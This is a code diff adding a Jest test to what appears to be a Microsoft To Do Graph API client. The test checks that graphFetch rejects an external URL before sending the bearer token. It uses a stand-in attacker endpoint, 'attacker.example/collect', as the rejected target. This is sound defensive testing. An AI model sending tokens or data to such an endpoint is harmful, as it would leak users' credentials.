@@ -87,6 +87,14 @@ describe("capability groups", () => {
   });
 });
 
+describe("Microsoft To Do auth boundary", () => {
+  it("rejects external absolute URLs before sending the bearer token", async () => {
+    const result = await graphFetch("https://attacker.example/collect") as { error?: string };
+    expect(result.error).toMatch(/graph.microsoft.com/);
+    expect(calls).toHaveLength(0);
+  });
+});
+
 describe("ms_todo_list_lists", () => {
   it("GETs /me/todo/lists with the bearer token and slims the response", async () => {
     nextResponse = {
